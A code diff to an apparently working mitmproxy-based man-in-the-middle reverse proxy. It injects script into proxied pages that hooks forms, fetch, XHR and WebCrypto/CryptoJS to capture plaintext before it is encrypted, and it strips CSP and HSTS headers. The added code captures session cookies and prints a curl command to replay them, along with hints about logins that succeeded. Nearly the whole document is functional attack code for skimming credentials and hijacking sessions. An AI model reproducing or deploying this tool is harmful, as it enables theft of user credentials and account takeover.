@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-MITM Reverse Proxy - Pre-Encryption Capture (minimal/optimized)
+MITM Reverse Proxy - Pre-Encryption Capture + Session Hijack
 """
 
 import argparse
 import asyncio
 import json
 import logging
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse
 
 from mitmproxy import http
 from mitmproxy.options import Options
@@ -20,7 +20,6 @@ INJECTED_SCRIPT = """
         navigator.sendBeacon('/mitm-capture', JSON.stringify({type, url, payload}));
     }
 
-    // Hook forms — capture phase fires before page's encryption listener
     function hookForms() {
         document.querySelectorAll('form').forEach(form => {
             if (form._hooked) return;
@@ -33,7 +32,6 @@ INJECTED_SCRIPT = """
         });
     }
 
-    // Hook fetch — save original before page JS can use it
     const _fetch = window.fetch;
     window.fetch = function(url, opts={}) {
         if (url !== '/mitm-capture' && opts.body) {
@@ -42,7 +40,6 @@ INJECTED_SCRIPT = """
         return _fetch.apply(this, arguments);
     };
 
-    // Hook XHR
     const _open = XMLHttpRequest.prototype.open;
     const _send = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.open = function(m, url) {
@@ -56,17 +53,17 @@ INJECTED_SCRIPT = """
         return _send.apply(this, arguments);
     };
 
-    // Hook WebCrypto — catches SubtleCrypto encryption before it runs
     const _encrypt = window.crypto.subtle.encrypt.bind(window.crypto.subtle);
     window.crypto.subtle.encrypt = function(algo, key, data) {
         try {
-            const plain = new TextDecoder().decode(data);
-            sendCapture('crypto', location.href, {algorithm: algo.name, plaintext: plain});
+            sendCapture('crypto', location.href, {
+                algorithm: algo.name,
+                plaintext: new TextDecoder().decode(data)
+            });
         } catch(_) {}
         return _encrypt(algo, key, data);
     };
 
-    // Hook CryptoJS if present
     if (window.CryptoJS) {
         ['AES', 'DES', 'TripleDES', 'Rabbit', 'RC4'].forEach(algo => {
             if (!CryptoJS[algo]) return;
@@ -99,6 +96,24 @@ def print_capture(source, url, data):
     print("="*60 + "\n")
 
 
+def print_session(url, cookies):
+    print("\n" + "*"*60)
+    print(f"  🍪 SESSION HIJACK — COOKIE CAPTURED")
+    print(f"  URL : {url}")
+    print(f"  {'─'*54}")
+    for cookie in cookies:
+        print(f"  {cookie}")
+    print(f"  {'─'*54}")
+    print(f"  Replay with curl:")
+    # Build cookie string for curl from all captured cookies
+    cookie_pairs = []
+    for cookie in cookies:
+        pair = cookie.split(";")[0].strip()  # grab name=value only
+        cookie_pairs.append(pair)
+    print(f'  curl -s http://127.0.0.1:8080/ -H "Cookie: {"; ".join(cookie_pairs)}"')
+    print("*"*60 + "\n")
+
+
 class ReverseProxyAddon:
     def __init__(self, target):
         self.parsed        = urlparse(target.rstrip("/"))
@@ -108,12 +123,16 @@ class ReverseProxyAddon:
         self.target_origin = f"{self.parsed.scheme}://{self.parsed.netloc}"
 
     def request(self, flow: http.HTTPFlow):
-        # Handle capture POSTs from injected JS — never forward to backend
+        # Intercept capture POSTs from injected JS
         if flow.request.path == "/mitm-capture":
             if flow.request.method == "POST":
                 try:
                     body = json.loads(flow.request.get_text())
-                    print_capture(body.get("type","?"), body.get("url","?"), body.get("payload", {}))
+                    print_capture(
+                        body.get("type", "?"),
+                        body.get("url", "?"),
+                        body.get("payload", {})
+                    )
                 except Exception as e:
                     logging.warning(f"Capture parse error: {e}")
             flow.response = http.Response.make(204, b"", {
@@ -134,24 +153,37 @@ class ReverseProxyAddon:
         resp = flow.response
         ct   = resp.headers.get("content-type", "")
 
-        # Strip headers that break proxying
+        # ── Session cookie capture ──────────────────────────────
+        session_keywords = ("session", "token", "auth", "jwt", "sid", "sess")
+        all_cookies = resp.headers.get_all("set-cookie") if hasattr(resp.headers, "get_all") else [
+            v for k, v in resp.headers.items() if k.lower() == "set-cookie"
+        ]
+        matched = all_cookies
+        if matched:
+            print_session(flow.request.pretty_url, matched)
+
+        # ── Login success hint ──────────────────────────────────
+        if flow.request.method == "POST" and resp.status_code in (301, 302, 303, 307, 308):
+            print(f"  ↳ Redirect after POST ({resp.status_code}) → likely successful login")
+
+        # ── Strip security headers ──────────────────────────────
         for h in ("content-security-policy", "content-security-policy-report-only",
                   "x-frame-options", "strict-transport-security"):
             resp.headers.pop(h, None)
 
-        # Rewrite redirects
+        # ── Rewrite redirects ───────────────────────────────────
         if "location" in resp.headers:
             loc = resp.headers["location"]
             if loc.startswith(self.target_origin):
                 resp.headers["location"] = loc[len(self.target_origin):]
 
+        # ── Rewrite + inject ────────────────────────────────────
         if "text/html" in ct or "text/css" in ct:
             try:
                 text = resp.get_text(strict=False)
                 text = text.replace(self.target_origin + "/", "/").replace(self.target_origin, "/")
 
                 if "text/html" in ct:
-                    # Inject as early as possible — <head> fires before body JS loads
                     if "<head>" in text:
                         text = text.replace("<head>", "<head>" + INJECTED_SCRIPT, 1)
                     elif "</body>" in text:
@@ -174,7 +206,7 @@ def main():
     upstream = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
 
     print(f"\n┌──────────────────────────────────────────┐")
-    print(f"│  MITM Proxy — Pre-Encryption Capture     │")
+    print(f"│  MITM Proxy — Capture + Session Hijack   │")
     print(f"│  Listen : http://127.0.0.1:{args.port:<14}│")
     print(f"│  Target : {upstream:<30}│")
     print(f"│  Ctrl+C to stop                          │")
